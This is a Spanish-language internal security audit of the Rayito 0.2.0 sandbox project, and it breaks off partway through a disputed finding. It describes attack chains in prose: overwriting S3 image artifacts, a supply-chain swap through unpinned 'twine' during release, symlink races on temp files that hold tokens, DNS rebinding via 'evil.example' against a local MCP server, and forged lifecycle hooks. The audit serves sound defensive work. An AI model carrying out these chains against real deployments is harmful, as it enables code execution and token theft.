# Auditoría de seguridad interna — Rayito 0.2.0

> Auditoría **interna**, de lectura de código. No sustituye a una auditoría
> externa ni a un pentest: lo que falta está en
> [§10](#10-qué-falta-para-un-audit-completo). Complementa `SECURITY.md` (modelo
> de amenazas T1–T15); aquí se listan los huecos que ese modelo **no cubre** o
> las frases que **no coinciden con el código**, no las mitigaciones que ya
> existen.

## 1. Fecha y alcance

**Fecha**: 2026-09-22.

El árbol auditado es el de la release 0.2.0 tal y como está en disco. Todavía no
hay repositorio publicado, así que **no hay commit que citar**: el alcance se
fija por versiones y por las tres imágenes publicadas desde ese árbol.

| Componente | Versión | Dónde |
|---|---|---|
| SDK Python `rayito` | 0.2.0 | `clients/python` |
| SDK TypeScript `rayito` | 0.2.0 | `clients/typescript` |
| Agente `rayd` | 0.2.0 | `crates/rayd`, `crates/rayd-core` (binario auditable 12 525 664 B, 256 crates en `.dep-v0`, sha256 `97eee1a9…`) |
| Sidecar de kernels | el que acompaña a `rayd` 0.2.0 | `kernel-sidecar` |
| Imagen `rayito-base` | **20.0** | `image/Dockerfile`, `--base-image-version 1`, `FROM …@sha256:05cb9b38…` |
| Imagen `rayito-base-caps` | **8.0** | mismo zip con `additionalOsCapabilities: ["ALL"]` |
| Imagen `rayito-base-poly` | **4.0** | capa condicional `kernels_variant=poly` |
| Infraestructura y CI | del mismo árbol | `infra/iam.yaml`, `infra/egress-connector.yaml`, `infra/ci-oidc-role.yaml`, `.github/workflows/*`, `Makefile`, `scripts/` |

Las tres imágenes son las publicadas en la cuenta de pruebas (us-east-1)
durante la aceptación de M7 el 2026-09-17 (`MILESTONES.md`, bloque de aceptación
de M7).

**Fuera de alcance**: la plataforma de AWS (Lambda MicroVMs, el proxy que
termina TLS y valida el JWE, el clonado del snapshot) se toma como TCB, tal y
como declara la tabla de confianza de `SECURITY.md`; los directorios `target*/`
y `.venv`; las dependencias vendorizadas de terceros salvo
`kernel-sidecar/src/rayito_kernel_sidecar/_vendor/e2b_charts`; y el spike de M0
(entonces bajo `spike/`, hoy sólo en el historial de git) salvo su plantilla
IAM, hoy `infra/iam.yaml`.

## 2. Método

Seis superficies, un auditor por superficie, con la instrucción de **leer código
antes que hacer grep** y de exigir a cada hallazgo un `file:line` y una cadena de
explotación concreta (quién es el atacante, qué controla, qué gana):

| Superficie | Qué cubrió |
|---|---|
| `auth` | `x-access-token`, el gate de `/run`, el payload del hook, los hooks de ciclo de vida, `HealthService` |
| `escape` | caída de privilegios, identidad de procesos y PTYs, rlimits, sidecar, bloqueo de IMDS |
| `fs` | `FilesystemService`, lista de denegación canónica, `FsIdentityGuard`, `WatchDir`, extracción de tar |
| `persist` | checkpoint/restore a S3, claves y manifest, `PersistenceService` |
| `sdk` | ambos SDKs, TLS, custodia del secreto, `SandboxPool`, CLI `rayito`, servidor MCP |
| `supply` | `image/Dockerfile`, `.github/workflows/*`, IAM y plantillas de `infra/`, publicación de imagen, código vendorizado |

Cada hallazgo pasó después por **dos refutadores independientes** con lentes
distintas, cuyo trabajo era tumbarlo:

- **Lente de código**: ¿el `file:line` dice lo que el hallazgo dice? ¿existe ya
  la mitigación en el código? ¿se cumple la precondición en esta arquitectura?
- **Lente de amenaza**: ¿cruza el atacante alguna frontera de confianza? ¿gana
  algo que no tuviera ya? ¿lo acepta `SECURITY.md` explícitamente?

Estados resultantes: **confirmado** (ningún refutador lo tumba), **en disputa**
(uno lo tumba, el otro no), **descartado** (los dos lo tumban). Severidades:
*bloqueante* (escape explotable, revelación de secretos o bypass de
autenticación), *mayor* (exposición de privilegio o de datos con precondiciones),
*menor* (hueco de endurecimiento).

Totales: **38 hallazgos propuestos, 76 refutaciones**.

### Lo que esta auditoría NO hizo

- **Sin pentest en vivo contra AWS**: ninguna de las cadenas descritas se ejecutó
  contra un MicroVM real. La verificación es de código, más la evidencia ya
  medida y registrada en `MILESTONES.md` y `AWS_API_NOTES.md` (que sí se usó, y
  que en dos casos tumbó un hallazgo — ver R-03 y R-07).
- **Sin fuzzing**: ni de la superficie del `.proto` (los cinco servicios gRPC
  contra mensajes malformados), ni del tar de restore (`Unpacker::unpack`), ni
  del protocolo JSON de líneas del sidecar.
- **Sin verificación formal**: el autómata de
  `crates/rayd-core/src/lifecycle.rs` se leyó y se contrastó con sus tests, no se
  verificó.
- **Sin red-team del servidor MCP**: sólo lectura de código. La revisión manual
  desde Claude Code sigue pendiente desde la aceptación de M7.
- **Sin revisión criptográfica de terceros**: Rayito no implementa criptografía
  propia (sha256 y comparación en tiempo constante con `subtle`), pero nadie ha
  revisado el uso de `rustls`/`aws-lc-rs` en el camino a S3.
- **Sin auditoría de la plataforma**: el proxy, los hooks y el snapshot de AWS se
  asumen correctos.
- **Una premisa quedó sin medir**, y se marca como tal en C-05: nadie midió el
  `/etc/passwd` de `public.ecr.aws/lambda/microvms:al2023-minimal`.

## 3. Resumen por severidad

| Severidad recomendada | Confirmados | En disputa | Total |
|---|---|---|---|
| Bloqueante | **0** | 0 | 0 |
| Mayor | 2 | 3 | 5 |
| Menor | 4 | 10 | 14 |
| **Total** | **6** | **13** | **19** |

Descartados: **19** (no se les asigna severidad).

**No hay ningún hallazgo bloqueante confirmado.** Se propusieron cinco como
bloqueantes —el plano de control de hooks en `0.0.0.0:9000` sin autenticación,
`user=` aceptando cuentas con uid < 1000, el `S3Location` no ligado al sandbox,
el publish de imagen que confía en una clave S3 existente y el prefijo de
artefactos alcanzable por el execution role— y ninguno sobrevivió como
bloqueante: uno quedó confirmado como mayor (H-01), tres en disputa (C-01, C-05,
C-07) y uno descartado (R-16). En los cinco casos el motivo de la rebaja fue el
mismo: el atacante que alcanza la cadena o ya está dentro de la frontera de
confianza (el operador del SDK, que posee las credenciales IAM que acuñan el JWE
y terminan la VM) o no cruza ninguna (código uid 1000 dentro de su propio
MicroVM monoinquilino).

No se encontró ningún escape del MicroVM, ninguna revelación del
`x-access-token` ni del JWE, y ningún bypass del gate de autenticación.

## 4. Hallazgos confirmados

### H-01 — El execution role del sandbox alcanza el prefijo de artefactos de imagen en el despliegue documentado

- **Severidad**: mayor (propuesto como bloqueante; ambos refutadores lo bajaron a
  mayor).
- **Fichero**: `infra/iam.yaml:117` (y `:30`, `:64`, `:124`, `:187`;
  `infra/README.md:159-160`;
  `clients/python/src/rayito/cli/_publish.py:74,198,215-224`).
- **Atacante**: código que corre dentro del sandbox como uid 1000 sobre la imagen
  por defecto `rayito-base`, donde IMDS **no** está bloqueado (T1 lo documenta
  como *fail-open*), en un sandbox creado con `execution_role_arn=` y `persist=`.
- **Explotación**: `PersistencePrefix` tiene `Default: rayito` (`iam.yaml:30`) y
  el statement `HomeArchiveObjects` concede al execution role
  `s3:PutObject/GetObject/AbortMultipartUpload` sobre
  `arn:aws:s3:::${PersistenceBucket}/${PersistencePrefix}/*` (`:117`) más
  `s3:ListBucket` acotado con `s3:prefix` (`:124`). El prefijo de artefactos es
  `arn:aws:s3:::${ArtifactBucket}/rayito/*` (`:64` para el `BuildRole`, `:187`
  para `CallerPolicy`) y `_publish.py:74` escribe bajo `rayito/images`. El
  comodín `*` de IAM atraviesa `/`, así que `<bucket>/rayito/*` ya cubre
  `rayito/images/rayd-<hash>.zip` **con el prefijo por defecto**, sin necesidad de
  ningún valor exótico. `infra/README.md:159-160` indica desplegar con el mismo
  `<bucket>` para `ArtifactBucket` y `PersistenceBucket` y
  `PersistencePrefix=rayito`. El código hostil lee las credenciales del execution
  role por IMDSv2, lista `rayito/images/` y sobrescribe el zip. La segunda mitad
  la aporta `upload_artifact` (`_publish.py:215-224`): si la clave existe, emite
  "artifact already in S3, skipping upload" y **nunca** compara el objeto remoto
  con los bytes locales (sin `ChecksumSHA256`, sin ETag, sin re-PUT), así que el
  siguiente `make image-publish` del mismo contenido entrega esa URI a
  `create/update-microvm-image` y el `BuildRole` la descarga con el permiso de
  `:64`.
- **Impacto**: en la receta documentada, el prefijo de persistencia y el de
  artefactos son el mismo espacio de nombres de S3. Dos consecuencias: (a) el
  código del sandbox lee y sobrescribe el `home.tar.gz` de cualquier otro sandbox
  bajo `rayito/`, mientras T15 afirma "El rol sólo alcanza `<bucket>/<prefix>/*`"
  como si eso lo acotara; (b) alcanza los artefactos de imagen, y con el salto por
  existencia de `_publish.py` eso se convierte en código del atacante dentro de
  `rayito-base`, corriendo como root (`rayd`) en todos los MicroVM que la cuenta
  lance después. **Nada en `SECURITY.md` cubre la integridad del artefacto entre
  el zip local y lo que Lambda construye**: T10 firma con cosign el *asset de la
  release*, nunca el objeto de S3 que consume el publish.
- **Por qué no es bloqueante**: el stack realmente desplegado **no** es
  vulnerable — `infra/README.md:186-191` registra `PersistencePrefix =
  rayito-e2e` y un `simulate-principal-policy` que devuelve `implicitDeny` sobre
  `rayito/x`. Además hacen falta cuatro opt-ins del operador apilados:
  `execution_role_arn` (por defecto `None`, T1), `persist=`, la imagen
  `rayito-base` en vez de `rayito-base-caps` (que la propia doc de persistencia
  prescribe, y donde uid ≥ 1000 no alcanza IMDS) y los dos parámetros del stack
  apuntando al mismo bucket. Lo roto es **el default de la plantilla y la receta
  del README**, que es justo lo que otros copiarán al publicar el proyecto.
- **Corrección**: (1) hacer los prefijos disjuntos por construcción: cambiar el
  `Default` de `PersistencePrefix` para que no sea `rayito`, o mover el prefijo de
  artefactos fuera de cualquier prefijo de persistencia plausible; (2) añadir un
  `Deny` explícito al `ExecutionRole` sobre
  `arn:aws:s3:::${ArtifactBucket}/rayito/images/*`; (3) corregir
  `infra/README.md:159-160` para usar dos buckets (o dos prefijos que no se
  solapen) y decir por qué; (4) en `_publish.py:219`, no saltar por mera
  existencia: `put_object(..., ChecksumAlgorithm="SHA256")` siempre, o
  `head_object(ChecksumMode="ENABLED")` y comparar con el digest local, y usar el
  sha256 **completo** en la clave; (5) exigir versionado del bucket y una política
  que restrinja la escritura de `rayito/images/*` al principal publicador.
  (1)–(3) antes de publicar; (4)–(5) con M8.

### H-02 — La ruta de release ejecuta herramientas de PyPI sin pin mientras sostiene el token OIDC de publicación

- **Severidad**: mayor (el refutador de amenaza la mantiene en mayor; el de
  código la bajaría a menor porque pinnear `twine` no cierra la clase — ver el
  residuo).
- **Fichero**: `.github/workflows/release.yml:139` (mismo patrón, sin token OIDC,
  en `.github/workflows/ci.yml:67,85,131,132` y `Makefile:185,186,242`).
- **Atacante**: quien controle la próxima release de `twine` en PyPI (toma de
  cuenta del mantenedor, o una release maliciosa). No necesita acceso al
  repositorio.
- **Explotación**: el job `python` declara `environment: pypi`
  (`release.yml:111`) y `permissions: id-token: write` (`:112-114`), lo que
  inyecta `ACTIONS_ID_TOKEN_REQUEST_URL`/`ACTIONS_ID_TOKEN_REQUEST_TOKEN` en el
  entorno del job, legibles por cualquier proceso de cualquier step. En `:135`
  `uv build` escribe la wheel y el sdist en `clients/python/dist/`; en `:137`
  `scripts/check_wheel.py` los comprueba; en **`:139`**
  `uvx twine check clients/python/dist/*` resuelve e instala el **último** `twine`
  de PyPI y lo ejecuta — sin `==`, sin lockfile, sin hashes. En `:147-149`
  `pypa/gh-action-pypi-publish` publica ese mismo directorio y genera las
  attestations PEP 740 **a partir de los ficheros en disco en ese momento**. Un
  `twine` malicioso sustituye la wheel entre `:139` y `:147`, o acuña él mismo un
  token OIDC contra `ACTIONS_ID_TOKEN_REQUEST_URL` y lo canjea por un token de
  publicación de PyPI. El único chequeo de integridad sobre `dist/` corre
  **antes** (`:137`), el `harden-runner` está en `egress-policy: audit`
  (`:118-120`) —registra la salida, no la bloquea— y el gate `no unpinned
  actions` (`ci.yml:44-49`) sólo mira líneas `uses:`, así que no ve un `run:`.
- **Impacto**: publicación de una wheel `rayito` con puerta trasera bajo la
  identidad de Trusted Publisher del proyecto, firmada y con provenance,
  indistinguible de una release legítima para quien la instale. `SECURITY.md:62`
  (T10) y `:147-157` enumeran pins (imagen por digest, acciones por SHA,
  `requirements.txt` con `==`, `cargo install --locked`, lockfiles) sin mencionar
  que la ruta de release ejecuta herramientas de terceros sin pin. Que la
  intención era pinnear lo demuestra `uvx pip-audit==2.10.1` en
  `ci.yml:171,173,177,181` y `audit.yml:51,53,57,61`.
- **Residuo importante**: pinnear `twine` **no** cierra la clase.
  `clients/python/pyproject.toml:58-60` declara
  `requires = ["uv_build>=0.7.19,<0.9"]`, un rango sin pin, así que `uv build` en
  `:135` ya resuelve y **ejecuta** un backend de build arbitrario de PyPI en el
  mismo job, cuatro líneas antes. La corrección estructural —construir en un job
  sin `id-token` y publicar desde un segundo job que sólo descargue el artefacto
  `python-dist-*`— es la única que cierra ambos, y de paso cierra C-10.
- **Corrección**: pinnear cada invocación de `uvx` (`uvx twine==<v>`,
  `uvx ruff==<v>`, `uvx cfn-lint==<v>`) y añadir un gate de CI que falle ante
  cualquier `uvx <nombre>` sin `==` (ahora); separar build y publish en dos jobs
  (M8); considerar `egress-policy: block` en los jobs de release.

### H-03 — `JsonFilePoolBackend` (Python) escribe los secretos de las plazas por un `<path>.tmp` preexistente o enlazado

- **Severidad**: menor (propuesto como mayor; ambos refutadores lo bajaron).
- **Fichero**: `clients/python/src/rayito/_pool_backends.py:106` (nombre del
  temporal en `:26`, lectura en `:95`).
- **Atacante**: un usuario local sin privilegios en la misma máquina que el
  proceso del pool, cuando el operador coloca el fichero de estado en un
  directorio escribible por otros uid (`/tmp`, un directorio de build compartido).
- **Explotación**: `_write` hace
  `os.open(temp, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, FILE_MODE)` con
  `temp = <path>.tmp`, un nombre totalmente predecible (`TEMP_SUFFIX = ".tmp"`).
  El argumento `mode` de `os.open` sólo se aplica **al crear** el fichero; no hay
  `O_EXCL`, no hay `O_NOFOLLOW` y no hay `os.fchmod` posterior. Dos variantes: (a)
  el atacante precrea `<path>.tmp` en 0666 y el siguiente `save()`/`delete()` lo
  trunca y escribe ahí los `access_token` de todas las plazas aparcadas **en
  claro**, y el `os.replace` siguiente promueve ese inodo 0666 a fichero de
  estado; (b) el atacante deja un symlink y `os.open` lo sigue, lo que además da
  un primitivo de truncado de ficheros arbitrarios con el uid del proceso del
  pool.
- **Impacto**: elude el control que `SECURITY.md:66` (T14) y
  `docs/site/docs/pool.md` nombran como mitigación — "un fichero JSON creado con
  modo `0600` y escrito de forma atómica". **Matiz que el hallazgo original
  exageraba**: en el caso normal (sin `<path>.tmp` previo) el 0600 **sí** se
  aplica, y hay tests que lo comprueban
  (`clients/python/tests/unit/test_pool_backends.py:100`); el control es
  *eludible*, no inexistente. El token robado es además un factor de dos:
  T14/ADR-004 exigen IAM **y** el secreto para alcanzar una plaza aparcada, así
  que por sí solo no abre ningún MicroVM.
- **Precondición**: el backend es opt-in (`InMemoryPoolBackend` es el default), la
  ruta la elige íntegramente el llamador (no hay ruta por defecto ni variable de
  entorno en ninguno de los dos SDKs) y el módulo ya advierte que el fichero es
  "tan sensible como `RAYITO_ACCESS_TOKEN`" (`:9-11`).
- **Corrección**: `os.open(temp, O_CREAT|O_EXCL|O_WRONLY|O_NOFOLLOW, FILE_MODE)`
  —tras un `lstat` que confirme que un `<path>.tmp` residual es un fichero regular
  propio antes de borrarlo— y `os.fchmod(descriptor, FILE_MODE)` antes de
  escribir; mejor aún, `tempfile.mkstemp(dir=self._path.parent)` (que es `O_EXCL`
  por construcción y con nombre aleatorio) más `fchmod`. Endurecer también la
  lectura: `_read` usa `read_text`, que sigue symlinks.

### H-04 — `JsonFilePoolBackend` (TypeScript) tiene el mismo defecto

- **Severidad**: menor.
- **Fichero**: `clients/typescript/src/pool/backend.ts:101` (constante en `:20`,
  lectura en `:85`).
- **Atacante**: el mismo que en H-03. Los dos SDKs comparten el formato
  `rayito.pool/1` por diseño, así que comparten fichero y directorio.
- **Explotación**: `writeFile(temp, ..., { encoding: "utf8", mode: FILE_MODE })`
  usa el flag `w` (`O_WRONLY|O_CREAT|O_TRUNC`): Node aplica `mode` sólo al crear y
  sigue symlinks. El `rename(temp, this.path)` siguiente promueve el inodo (o el
  symlink) del atacante a fichero de estado, y `backend.ts:85`
  (`readFile(this.path, "utf8")`) lo sigue en las lecturas posteriores, lo que
  además permite inyectar `SlotRecord` falsos en el pool.
- **Impacto**: idéntico a H-03, sobre la misma afirmación de `SECURITY.md` T14 y
  de `docs/site/docs/pool.md`.
- **Corrección**: `await open(temp, 'wx', FILE_MODE)` (falla si existe, así que ni
  un fichero precreado ni un symlink se reutilizan),
  `await handle.chmod(FILE_MODE)`, escribir por el handle, cerrar y `rename`;
  limpiar un `<path>.tmp` residual sólo después de que `lstat` confirme que es un
  fichero regular propio.
- **Nota**: en el recuento van como dos hallazgos porque son dos ficheros y dos
  correcciones, pero es **un solo defecto**. No cerrar uno sin el otro.

### H-05 — `rayito-mcp --http` trata todo 127.0.0.0/8 como loopback seguro, pero sólo tres hosts literales obtienen la protección anti-rebinding del SDK `mcp`

- **Severidad**: menor (ambos refutadores).
- **Fichero**: `clients/python/src/rayito/mcp/_cli.py:85` (host por defecto en
  `:31`, uso en `:103-109`).
- **Atacante**: cualquier página web que el desarrollador visite mientras corre
  `rayito-mcp --http --host 127.0.0.2` (o cualquier 127.0.0.x que no sea `.1`, o
  una grafía alternativa del loopback IPv6).
- **Explotación**: `is_loopback` acepta todo lo que
  `ipaddress.ip_address(host).is_loopback` acepte, es decir **todo**
  127.0.0.0/8, así que `run()` no emite el aviso y pasa el host tal cual a
  `invoke(transport=STREAMABLE_HTTP, host=..., port=...)` sin construir ningún
  `transport_security`. `mcp` 2.2.0 auto-activa la protección contra DNS
  rebinding **sólo** cuando `host in ("127.0.0.1", "localhost", "::1")`
  (`mcp/server/lowlevel/server.py:742` en la ruta streamable HTTP que Rayito usa;
  el gemelo SSE está en `mcp/server/mcpserver/server.py:1155`). Al fallar esa
  comparación exacta, `TransportSecurityMiddleware.__init__`
  (`mcp/server/transport_security.py:46-47`) construye
  `TransportSecuritySettings(enable_dns_rebinding_protection=False)` "for
  backwards compatibility" y `validate_request` retorna antes de mirar `Host` u
  `Origin`. Una página maliciosa resuelve `evil.example` a 127.0.0.2 y hace POST
  JSON-RPC a `http://evil.example:8000/mcp`; tras el rebinding el navegador lo
  trata como same-origin, así que no hay preflight (el único chequeo vivo es el
  de `Content-Type`) y la página puede **leer** la respuesta, incluida la cabecera
  `mcp-session-id` con la que completa el handshake. Alcanza `run_code`,
  `run_command`, `read_file`, `write_file`, `list_files` y `list_sandboxes`
  (`clients/python/src/rayito/mcp/_server.py:164-262`).
- **Impacto**: ejecución de código y lectura/escritura de ficheros dentro del
  sandbox del desarrollador desde cualquier sitio web, en una configuración que la
  CLI bendice con su silencio. `docs/site/docs/mcp.md:176` refuerza la premisa
  falsa ("El modo HTTP no autentica a nadie y por eso escucha en loopback"):
  loopback es exactamente lo que el DNS rebinding rompe. El `SECURITY.md` actual
  no menciona el servidor MCP en ninguna fila.
- **Por qué es menor**: el host por defecto (`DEFAULT_HTTP_HOST = "127.0.0.1"`)
  **sí** cae dentro de la tupla protegida, y
  `clients/python/tests/unit/test_mcp_main.py:83-87` parametriza exactamente
  127.0.0.1 / `::1` / `localhost` / 0.0.0.0 / `host`: los tres hosts que el
  proyecto usa son los tres que el SDK protege. Hace falta que el desarrollador
  elija a mano una dirección de bind exótica.
- **Nota estructural**: Rayito nunca configura `transport_security`, así que
  incluso la configuración por defecto es segura **sólo** por una heurística de
  cadena de host dentro de un SDK de terceros que el pin `mcp>=2.2,<3` no fija.
- **Corrección**: construir los ajustes en `run()` y pasarlos siempre —
  `TransportSecuritySettings(enable_dns_rebinding_protection=True,
  allowed_hosts=[f"{options.host}:{options.port}"],
  allowed_origins=[f"http://{options.host}:{options.port}"])` — manteniendo el
  aviso actual para hosts no loopback; añadir a `docs/site/docs/mcp.md` que
  escuchar en loopback no impide que un navegador llegue al servidor; añadir un
  caso de test con 127.0.0.2.

### H-06 — La confianza OIDC se documenta como restringida por rama, pero sólo fija repositorio y environment

- **Severidad**: menor (ambos refutadores).
- **Fichero**: `infra/ci-oidc-role.yaml:72` (parámetros en `:9-35`, salida
  `TrustedSubject` en `:108-110`); afirmación contradicha en
  `infra/README.md:122`.
- **Atacante**: cualquiera con `contents: write` + `actions: write` sobre
  `alejandro-cedeno-10/rayito` (un contribuidor nuevo, un portátil de mantenedor comprometido,
  un PAT robado).
- **Explotación**: la única condición es
  `StringEquals { token.actions.githubusercontent.com:sub: repo:${GitHubRepository}:environment:${GitHubEnvironment} }`.
  El `sub` de un job con environment **no lleva componente de rama**, así que
  cualquier workflow de cualquier rama que declare `environment: e2e` presenta ese
  `sub` exacto. `e2e.yml` se dispara por `workflow_dispatch` (que permite elegir
  la ref y ejecuta la copia del workflow de esa ref) y por cron; ambos jobs
  declaran `environment: e2e` (`:73`, `:124`) y asumen
  `vars.RAYITO_E2E_ROLE_ARN` (`:86`, `:140`). No existe parámetro `GitHubRef` en
  la plantilla ni política de ramas de despliegue documentada en ninguna parte
  (`grep` de `deployment branch|GitHubRef|refs/heads` sobre `infra/`, `.github/` y
  `SECURITY.md`: sin resultados).
- **Impacto**: `infra/README.md:122` afirma lo contrario — "otra rama, otro
  environment u otro repositorio no pueden asumirlo". Las dos últimas mitades son
  ciertas; la de la rama no. Con una aprobación (*required reviewers*,
  `infra/README.md:195`), quien controla una rama obtiene una sesión de 1 h con
  `lambda:RunMicrovm`/`CreateMicrovmAuthToken` sobre las imágenes de test y
  `ListMicrovms`, y como controla el fichero del workflow también esquiva las
  salvaguardas internas (pre-flight de > 10 VMs, `concurrency: e2e`, el sweeper
  `always()`). El daño está acotado: la política no lleva permisos de imagen, S3,
  cuotas ni etiquetas, `MaxSessionDuration` es 3600, y el `iam:PassRole` está
  condicionado a `ExecutionRoleArn`, que por defecto es `""` (`:28-31`,
  `Conditions.HasExecutionRole` `:39`, `!If` `:96-102`) — y `e2e.yml:22` dice
  explícitamente que CI no pasa rol. `SECURITY.md:157` es preciso ("trust exacto a
  `environment: e2e`"); la afirmación falsa está sólo en el README de `infra/`.
- **Corrección**: corregir `infra/README.md:122`, y cerrar la rama de una de las
  dos formas: (a) configurar las *deployment branches* del environment `e2e` a
  `main` y documentarlo, o (b) añadir un parámetro `GitHubRef` y una segunda
  condición `StringLike` sobre la forma `repo:<repo>:ref:refs/heads/main` del
  `sub`. El stack está documentado como **no desplegado**, así que (a) se puede
  fijar en el mismo momento en que se cree el environment.

## 5. Hallazgos en disputa

Un refutador los tumbó y el otro no. En todos los casos **los hechos de código
son ciertos y verificados**; lo que se discute es la severidad o si el atacante
gana algo que no tuviera ya. Para cada uno: qué sostiene el auditor, qué
responde el refutador, y la recomendación de este informe.

### C-01 — El plano de control de hooks escucha en `0.0.0.0:9000` sin autenticación y es alcanzable desde dentro del sandbox

- **Fichero**: `crates/rayd/src/main.rs:280`, `crates/rayd/src/hooks/mod.rs:130-147`.
- **Auditor** (propuesto bloqueante; lente de código lo mantiene en mayor):
  `bind_listeners` escucha en `0.0.0.0:9000` y `router_with` monta las seis rutas
  `POST` **sin ninguna capa de autenticación** — contraste con
  `crates/rayd/src/grpc/mod.rs:117`, donde `AccessTokenLayer` envuelve todos los
  RPC. No hay netns, ni seccomp, ni cgroups en todo el árbol, y la ruta de
  política de `adapters/imds_block.rs` sólo agujerea `169.254.169.254/32` para
  uid ≥ 1000: `127.0.0.1` queda intacto. Una celda basta.
  `/terminate` (`hooks/mod.rs:503-516`) cancela el `CancellationToken` y `rayd`
  es el `CMD` de la imagen (`image/Dockerfile:123`), así que la VM se va con él;
  `/suspend` en bucle mantiene el `stream_gate` cerrado (el watchdog sólo reabre
  tras `SUSPEND_GATE_TIMEOUT` = 20 s) y deja al operador fuera de su propio
  sandbox mientras los procesos del atacante siguen vivos.
- **Refutador** (lente de amenaza, → menor): no se cruza ninguna frontera. El
  atacante sigue en su MicroVM monoinquilino, no obtiene credencial, secreto ni
  primitivo nuevo; `HookReply` no filtra nada y un `/run` forjado da
  `already_ran`. La destrucción de datos y la denegación de servicio ya las tiene
  (T7 acepta explícitamente que no hay contención de CPU/memoria/IO, y con
  `RLIMIT_NPROC 512` puede dejar el sandbox inservible), y T2 usa ese mismo
  razonamiento para descartar el DoS por hooks forjados.
- **Recomendación: mayor.** Los dos refutadores coinciden en que **no** es
  bloqueante, y en que el mecanismo es real y no está mitigado. La diferencia con
  el DoS que T7 acepta es de calidad: `/terminate` es irreversible y `/suspend`
  bloquea el `Checkpoint` (`persistence/manager.rs`), de modo que el operador
  pierde el `HOME` no salvado sin poder intervenir. Además el hueco es
  **documental**: T2 acota la amenaza a "alcanzables desde **fuera** con un JWE
  `allPorts`", nombra un único control ("9000 nunca en `allowedPorts`") que sólo
  acota el alcance externo, y ni siquiera lista `/terminate` entre los hooks
  forjables; el e2e `test_m6_hardening.py:246` modela sólo al atacante externo.
  Corrección: autenticar por credenciales del par (resolver el `SocketAddr` del
  par contra `/proc/net/tcp`/`tcp6` y rechazar —auditando, con 200— cuando el uid
  propietario sea ≥ 1000; el agente de plataforma usa 991-994, `AWS_API_NOTES`
  Q48), al menos en `/terminate` y `/validate`. **Bindear a `127.0.0.1` no sirve**:
  el atacante comparte el netns. Dos erratas del hallazgo original: el umbral de
  20 s es `SUSPEND_GATE_TIMEOUT` (`lifecycle.rs:28`), no `FREEZE_THRESHOLD`
  (5 s, `:32`), y `imds_block.rs` instala una ruta de política, no una regla
  `iptables owner` (el kernel del guest no trae `xt_owner`).

### C-02 — Un `/validate` forjado en runtime reinicia el kernel por defecto del cliente

- **Fichero**: `crates/rayd/src/hooks/mod.rs:227`.
- **Auditor** (mayor): el handler no tiene guarda de fase —
  `LifecycleState::validate` (`lifecycle.rs:224`) nunca cambia de fase ni falla, y
  el test `validate_never_changes_the_phase` lo fija — y lee
  `code.validation_state()`, que en toda VM de producción es `Idle` porque el
  snapshot se toma tras `/ready` y `/validate` corre en una VM desechable
  (`AWS_API_NOTES.md:183,295`). Así que `ValidateDecision::Start` dispara,
  `start_validation` lanza `run_validation` y su primer acto es
  `restart_context(DEFAULT_CONTEXT_ID)` (`code/validate.rs:23`), seguido de
  `VALIDATE_CELL` por `execute_unchecked`, que **salta el `stream_gate`** por
  diseño ("`/validate` runs before `/run`"). T2 afirma de un `/run` forjado que
  "el kernel no se reinicia" y no considera `/validate` como objetivo.
- **Refutador** (→ menor): el atacante es uid 1000 en un sandbox monoinquilino y
  el sidecar y los kernels corren con ese mismo uid, sin namespace de PID: ya
  puede matar el ipykernel con una señal o con `os._exit()`, que es estrictamente
  más destructivo. El actor externo con `allPorts` es el dueño de la cuenta, que
  ya puede llamar a `TerminateMicrovm`. Además es **de una sola vez por
  arranque**: `start_validation` sólo actúa desde `Idle` y nunca vuelve a `Idle`.
- **Recomendación: menor**, con corrección documental inmediata. Lo sustantivo es
  que `SECURITY.md` T2 contiene una frase falsa sobre el reinicio del kernel y que
  el radio de daño real es el contexto `default` del propio inquilino. La
  corrección de código (rechazar `/validate` y `/ready` con `outcome` "illegal"
  —nunca un no-200, que mataría la VM— una vez `run_claimed`, y retirar
  `execute_unchecked` cuando la fase ya salió de `Ready`) es barata y cabe en M8.

### C-03 — `/ready` y `/validate` nunca se auditan, así que la mitigación de M6 tiene un hueco

- **Fichero**: `crates/rayd/src/hooks/mod.rs:240` (definición de `audit()` en
  `:351`).
- **Auditor**: `audit()` se invoca desde exactamente cuatro sitios — `:282`
  (`/run`), `:306` (`/suspend`), `:452` (`/resume`), `:506` (`/terminate`). Los
  handlers de `/ready` (`:199-222`) y `/validate` (`:227-253`) no lo llaman nunca,
  así que un `/validate` forjado no produce línea `hook_audit`, no toca
  `calls_since_run` y no incrementa `Health.hook_anomalies`. `hooks.rs:95-104`
  reserva los índices 0 y 1 para `Ready` y `Validate`, contadores que nunca pueden
  subir. `ARCHITECTURE.md:299` dice "cada hook se audita" y T2 ofrece "auditoría
  `hook_audit` de cada hook tras el primer `/run`": son 4 de 6.
- **Refutador** (→ menor): la afirmación "CloudWatch no tiene registro" es falsa —
  un `/validate` forjado deja `hook acknowledged` con `from=running,to=running`
  (`:608-615`), `validate cell started` (`:240`) y `validate cell finished`; un
  `/ready` post-`/run` es **rechazado** (`lifecycle.rs:215-219`) y se loguea a
  `warn` con `outcome="illegal"`. El doc del módulo (`:4-6`, `:23-24`) es
  coherente consigo mismo: llama a `/ready` y `/validate` "the build-time hooks" y
  acota la auditoría a "every runtime hook". Y `ARCHITECTURE.md:301-302` enumera
  qué contiene `hook_anomalies` ("`/run` repetido y recuperaciones del watchdog").
- **Recomendación: menor.** El hueco real es de precisión documental
  (`ARCHITECTURE.md:299-300` y `SECURITY.md` T2 dicen "cada hook" donde el código
  y el resto de la doc dicen "cada hook de runtime") más dos contadores muertos.
  Corrección: arreglar las dos frases ahora; añadir `audit()` a `validate` (y a
  `ready`) en M8 — es seguro incondicionalmente, porque `HookAudit::record`
  devuelve `None` antes del `/run` aceptado, así que las llamadas legítimas de la
  fase de build no registran nada.

### C-04 — `Health` anónimo entrega al propio código del sandbox el id y las etiquetas `metadata` del cliente

- **Fichero**: `crates/rayd/src/grpc/health.rs:97`.
- **Auditor**: `requires_access_token` (`rayd-core/src/auth.rs:135-137`) deja
  pasar `/rayito.v1.HealthService/Health` sin metadata alguna y el listener gRPC
  está en `0.0.0.0:8080`; `to_response` (`health.rs:85-99`) devuelve `sandbox_id`,
  el mapa `metadata` completo, `imds_blocked`, `hook_anomalies`, `clock_offset_ms`
  y `resume_generation`. Código del sandbox abre h2c contra `127.0.0.1:8080` y lo
  lee todo sin JWE, sin IAM y sin secreto. T4 y `docs/site/docs/security.md:23-29`
  describen al lector como "cualquier principal que pueda acuñar un JWE" /
  "cualquier principal con `lambda:CreateMicrovmAuthToken`": ambos describen
